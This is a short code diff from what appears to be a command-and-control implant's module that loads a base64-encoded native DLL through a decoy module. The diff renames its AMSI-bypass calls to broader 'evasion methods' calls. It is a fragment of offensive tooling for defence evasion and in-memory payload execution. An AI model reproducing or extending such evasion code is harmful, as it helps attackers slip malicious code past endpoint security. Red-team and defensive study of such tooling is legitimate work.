@@ -25,7 +25,7 @@ namespace Drone.Modules
 
         private void OverloadNativeDll(DroneTask task, CancellationToken token)
         {
-            Evasion.BypassAmsi();
+            Evasion.DeployEvasionMethods();
 
             var dll = Convert.FromBase64String(task.Artefact);
             var decoy = Overload.FindDecoyModule(dll.Length);
@@ -51,7 +51,7 @@ namespace Drone.Modules
                 typeof(GenericDelegate),
                 funcParams);
             
-            Evasion.RestoreAmsi();
+            Evasion.RestoreEvasionMethods();
 
             Drone.SendResult(task.TaskGuid, result);
         }
